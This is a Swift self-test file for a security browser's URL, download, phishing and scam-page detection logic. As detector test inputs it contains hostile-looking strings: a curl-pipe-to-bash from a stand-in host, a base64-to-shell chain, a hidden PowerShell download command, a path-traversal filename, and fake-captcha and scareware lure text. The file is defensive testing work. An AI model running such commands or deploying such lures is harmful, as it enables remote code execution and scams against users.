import Foundation
import RampartWeb

/// Headless logic tests, run with `RampartBrowser --selftest`. No AppKit, no WebKit, no network,
/// no keychain, no pasteboard. Mirrors the `check(cond, name)` style of rampart-selftest.
enum BrowserSelfTests {
    static var passed = 0, failed = 0
    static func check(_ cond: Bool, _ name: String, file: StaticString = #file, line: UInt = #line) {
        if cond { passed += 1 } else { failed += 1; print("FAIL  \(name)  (\(file):\(line))") }
    }

    static func run() -> Bool {
        urlPolicy(); interstitials(); downloads(); pageFindings(); domainDisplay(); contentRules(); typedInput(); punycodeASCII(); hx6(); wmsO3()
        print("RampartBrowser selftest: \(passed) passed, \(failed) failed")
        return failed == 0
    }

    static func urlPolicy() {
        let p = URLDecisionPolicy()
        let safe = URLFacts()
        check(p.decide(url: URL(string: "https://www.apple.com/")!, facts: safe) == .allow, "https allowed")
        check(p.decide(url: URL(string: "http://example.com/a?b=1")!, facts: safe) == .upgrade(URL(string: "https://example.com/a?b=1")!), "http upgraded to https")
        check(p.decide(url: URL(string: "http://example.com:80/")!, facts: safe) == .upgrade(URL(string: "https://example.com/")!), "port 80 dropped on upgrade")
        if case .warn(let r, _) = p.decide(url: URL(string: "http://example.com/")!, facts: safe, httpUpgradeFailed: true) { check(r == [.plainHTTP], "plain http warns after failed upgrade") } else { check(false, "plain http warns after failed upgrade") }
        check(p.decide(url: URL(string: "http://localhost:8080/")!, facts: safe) == .allow, "loopback http allowed")
        var allowed = p; allowed.httpAllowedHosts = ["example.com"]
        check(allowed.decide(url: URL(string: "http://example.com/")!, facts: safe, httpUpgradeFailed: true) == .allow, "http allowed after continue")
        check(p.decide(url: URL(string: "javascript:alert(1)")!, facts: safe) == .block([.dangerousScheme], score: 100), "javascript: blocked")
        check(p.decide(url: URL(string: "file:///etc/passwd")!, facts: safe) == .block([.dangerousScheme], score: 100), "file: blocked")
        check(p.decide(url: URL(string: "about:blank")!, facts: safe) == .allow, "about:blank allowed")
        if case .block(let r, let s) = p.decide(url: URL(string: "https://evil.example/")!, facts: URLFacts(blocklistHit: "urlhaus")) { check(r.first == .blocklisted && s >= 95, "blocklist hit blocks") } else { check(false, "blocklist hit blocks") }
        if case .block(let r, _) = p.decide(url: URL(string: "https://paypa1-secure.top/login")!, facts: URLFacts(scamScore: 80, scamVerdict: .likelyScam, brandMatch: "PayPal")) { check(r.contains(.likelyScam) && !r.contains(.lookalikeDomain), "likely scam blocks (lookalike folded in)") } else { check(false, "likely scam blocks") }
        if case .warn(let r, _) = p.decide(url: URL(string: "https://apple-id-verify.example/")!, facts: URLFacts(scamScore: 40, scamVerdict: .suspicious, brandMatch: "Apple")) { check(r == [.suspiciousURL, .lookalikeDomain], "suspicious + lookalike warns") } else { check(false, "suspicious + lookalike warns") }
        if case .warn(let r, _) = p.decide(url: URL(string: "https://93.184.216.34/")!, facts: safe) { check(r == [.rawIPHost], "raw ip warns") } else { check(false, "raw ip warns") }
        check(p.decide(url: URL(string: "https://paypa1-secure.top/")!, facts: URLFacts(scamScore: 80, scamVerdict: .likelyScam, brandMatch: "PayPal", allowlisted: true)) == .allow, "allowlisted host passes")
        check(p.decide(url: URL(string: "https://cdn.example/x.js")!, facts: URLFacts(scamVerdict: .suspicious), isMainFrame: false) == .allow, "subframe suspicious is allowed (content rules handle it)")
        check(!p.decide(url: URL(string: "https://evil.example/x.js")!, facts: URLFacts(blocklistHit: "x"), isMainFrame: false).isAllowed, "subframe blocklist still blocked")
        check(URLDecisionPolicy.isRawIP("10.0.0.1") && !URLDecisionPolicy.isRawIP("10.0.0.256") && !URLDecisionPolicy.isRawIP("a.b.c.d"), "raw ip detection")
    }

    static func interstitials() {
        check(Interstitial.select(for: .allow, host: "x") == nil, "no interstitial for allow")
        let b = Interstitial.select(for: .block([.blocklisted, .likelyScam], score: 97), host: "evil.example")!
        check(b.tone == .danger && b.primaryLabel == "Go back" && !b.showsContinue && b.secondaryLabel == nil && b.reasons.count == 2, "block interstitial: go back only")
        let bd = Interstitial.select(for: .block([.likelyScam], score: 90), host: "evil.example", developerMode: true)!
        check(bd.showsContinue && bd.secondaryLabel?.contains("unsafe") == true, "developer mode exposes visit anyway")
        let w = Interstitial.select(for: .warn([.lookalikeDomain], score: 70), host: "paypa1.example")!
        check(w.tone == .caution && w.showsContinue && w.secondaryLabel == "Continue anyway" && w.body.contains("paypa1.example"), "warn interstitial names host")
        let h = Interstitial.select(for: .warn([.plainHTTP], score: 35), host: "old.example")!
        check(h.title.contains("isn't private") && h.body.contains("HTTPS"), "plain http copy")
    }

    static func downloads() {
        check(DownloadClass.classify(filename: "Setup.dmg", mimeType: nil) == .diskImage, "dmg class")
        check(DownloadClass.classify(filename: "install.sh", mimeType: nil) == .script, "sh class")
        check(DownloadClass.classify(filename: "statement.pdf", mimeType: "application/pdf") == .document, "pdf class")
        check(DownloadClass.classify(filename: "x", mimeType: "application/octet-stream") == .executable, "octet-stream is executable")
        check(DownloadClass.classify(filename: "photo", mimeType: "image/jpeg") == .media, "image mime")
        let p = DownloadPolicy()
        check(p.decide(class: .document, outcome: .clean, fromRiskySite: false) == .release, "clean document released")
        if case .blocked = p.decide(class: .document, outcome: .infected(name: "EICAR-Test-File"), fromRiskySite: false) {} else { check(false, "infected blocked") }
        if case .holdForConfirmation = p.decide(class: .executable, outcome: .unavailable, fromRiskySite: false) {} else { check(false, "unscanned executable held") }
        check(p.decide(class: .document, outcome: .unavailable, fromRiskySite: false) == .release, "unscanned document released")
        if case .holdForConfirmation = p.decide(class: .document, outcome: .unavailable, fromRiskySite: true) {} else { check(false, "unscanned from risky site held") }
        if case .holdForConfirmation = p.decide(class: .installer, outcome: .clean, fromRiskySite: true) {} else { check(false, "clean installer from risky site held") }
        if case .holdForConfirmation = DownloadPolicy(bankingMode: true).decide(class: .executable, outcome: .clean, fromRiskySite: false) {} else { check(false, "banking mode holds executables") }
        check(DownloadPolicy(bankingMode: true).decide(class: .document, outcome: .clean, fromRiskySite: false) == .release, "banking mode releases documents")
        let q = DownloadPolicy.quarantineAttribute(agent: "T", date: Date(timeIntervalSince1970: 0x5f000000), uuid: UUID(uuidString: "00000000-0000-0000-0000-000000000001")!)
        check(q == "0083;5f000000;T;00000000-0000-0000-0000-000000000001", "quarantine xattr format")
        check(DownloadPolicy.safeFilename("../../.hidden/evil.sh") == "_.._.hidden_evil.sh" || !DownloadPolicy.safeFilename("../../.hidden/evil.sh").contains("/"), "filename has no separators")
        check(!DownloadPolicy.safeFilename(".DS_Store").hasPrefix("."), "no leading dot")
        check(DownloadPolicy.safeFilename("   ") == "download", "empty name fallback")
    }

    static func pageFindings() {
        check(ClipboardRule.looksLikeShellCommand("curl -fsSL https://x.example/a.sh | bash"), "curl|bash is a command")
        check(ClipboardRule.looksLikeShellCommand("echo aGVsbG8= | base64 -d | sh"), "base64 chain is a command")
        check(ClipboardRule.looksLikeShellCommand("powershell -w hidden -c \"iwr http://x\""), "powershell is a command")
        check(!ClipboardRule.looksLikeShellCommand("Your order #12345 has shipped"), "plain text is not a command")
        check(!ClipboardRule.looksLikeShellCommand("https://example.com/page"), "a bare url is not a command")
        check(ClickFixRule.matches("Verify you are human. Press ⌘ + Space, then press ⌘ + V and press Enter"), "clickfix text matches")
        check(!ClickFixRule.matches("Verify you are human by ticking the box"), "real captcha text does not match")
        check(ScarewareRule.matches("APPLE SECURITY ALERT: Your Mac is infected with 3 viruses. Call Apple Support now."), "scareware matches")
        check(!ScarewareRule.matches("Install antivirus software and keep it updated."), "advice is not scareware")

        check(PageFindingPolicy.verdict([]) == .clean, "no findings is clean")
        if case .notice = PageFindingPolicy.verdict([PageFinding(kind: .hiddenIframe, detail: "ads.example")]) {} else { check(false, "hidden iframe is a notice") }
        if case .block = PageFindingPolicy.verdict([PageFinding(kind: .fakeCaptcha, detail: "cmd+space")]) {} else { check(false, "fake captcha blocks") }
        if case .block = PageFindingPolicy.verdict([PageFinding(kind: .clipboardCommand, detail: "curl"), PageFinding(kind: .fakeVirusAlert, detail: "x")]) {} else { check(false, "clipboard + scareware blocks") }
        if case .warning = PageFindingPolicy.verdict([PageFinding(kind: .credentialForm, detail: "x")]) {} else { check(false, "credential form warns") }
        if case .block = PageFindingPolicy.verdict([PageFinding(kind: .walletDrainer, detail: "a"), PageFinding(kind: .credentialForm, detail: "b")]) {} else { check(false, "drainer + credential form blocks (score ≥ 90)") }
        check(PageFindingPolicy.combine([PageFinding(kind: .hiddenIframe, detail: "a"), PageFinding(kind: .hiddenIframe, detail: "b")]) < 40, "repeated kind adds little")
        let decoded = PageFindingPolicy.decode(["findings": [["kind": "fakeVirusAlert", "detail": "x", "sample": "y"], ["kind": "nonsense", "detail": "z"]]] as [String: Any])
        check(decoded.count == 1 && decoded[0].kind == .fakeVirusAlert && decoded[0].sample == "y", "decode drops unknown kinds")
        check(PageFindingPolicy.decode("garbage").isEmpty, "decode tolerates garbage")
    }

    static func domainDisplay() {
        let d = DomainDisplay.make(url: URL(string: "https://online.banking.hsbc.co.uk/account/summary?x=1")!)
        check(d.domain == "hsbc.co.uk" && d.prefix == "https://online.banking." && d.suffixPath == "/account/summary?x=1" && d.identity == .secure, "registrable domain split")
        let plain = DomainDisplay.make(url: URL(string: "http://intranet.example/")!)
        check(plain.identity == .insecure && plain.lockSymbol.contains("open"), "http shows open lock")
        let puny = DomainDisplay.make(url: URL(string: "https://www.xn--pple-43d.com/")!)
        if case .punycode(let dec) = puny.identity { check(dec.contains("pple"), "punycode decoded") } else { check(false, "punycode flagged") }
        check(puny.isWarning, "punycode is a warning")
        let look = DomainDisplay.make(url: URL(string: "https://paypal-secure.example/")!, brandMatch: "PayPal")
        check(look.identity == .lookalike(brand: "PayPal") && look.identityLabel == "Not PayPal", "lookalike label")
        let blank = DomainDisplay.make(url: URL(string: "about:blank")!)
        check(blank.identity == .local && blank.fullText == "" && blank.domain == "New tab", "about:blank display")
        let id = IdentitySummary(host: "x.example", encrypted: true, evaluatedOK: true)
        check(id.headline.contains("encrypted") && !id.caveat.isEmpty, "identity headline")
        check(IdentitySummary(host: "x.example", encrypted: false).headline.contains("not encrypted"), "identity plain")
    }

    static func contentRules() {
        let json = ContentRules.json(trackers: ["doubleclick.net"], fingerprinters: ["fpjs.io"])
        guard let data = json.data(using: .utf8), let arr = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]] else { check(false, "rules json parses"); return }
        check(arr.count == 4, "rules: 1 tracker + 1 fingerprinter + cookies + https")
        let first = arr[0]["trigger"] as? [String: Any]
        check((first?["url-filter"] as? String)?.contains("doubleclick\\.net") == true, "tracker host escaped")
        check((first?["load-type"] as? [String]) == ["third-party"], "third-party only")
        check((arr[2]["action"] as? [String: Any])?["type"] as? String == "block-cookies", "third-party cookies blocked")
        check((arr[3]["action"] as? [String: Any])?["type"] as? String == "make-https", "mixed content upgraded")
        check(ContentRules.trackerHosts.count == Set(ContentRules.trackerHosts).count, "no duplicate tracker hosts")
        check(!ContentScript.scanner.isEmpty && ContentScript.scanner.contains("rampartFindings") && ContentScript.pageWorldShim.contains("writeText"), "scripts contain handlers")
        check(ContentScript.brandKeywords.count > 20, "brand keywords injected")
    }

    static func typedInput() {
        check(URLDecisionPolicy.resolveTyped("apple.com")?.absoluteString == "https://apple.com", "bare host gets https")
        check(URLDecisionPolicy.resolveTyped("http://example.com/x")?.absoluteString == "http://example.com/x", "explicit url kept (policy upgrades later)")
        check(URLDecisionPolicy.resolveTyped("how to spot phishing")?.host == "duckduckgo.com", "words become a search")
        check(URLDecisionPolicy.resolveTyped("  ") == nil, "blank is nil")
        check(URLDecisionPolicy.resolveTyped("localhost:3000")?.host == "localhost", "localhost with port")
    }
}

extension BrowserSelfTests {
    static func punycodeASCII() {
        check(DomainDisplay.make(url: URL(string: "https://www.xn--pple-43d.com/")!).asciiHost == "www.xn--pple-43d.com", "ascii host kept for punycode")
        check(DomainDisplay.make(url: URL(string: "https://apple.com/")!).asciiHost.isEmpty, "ascii host empty for plain")
    }
}
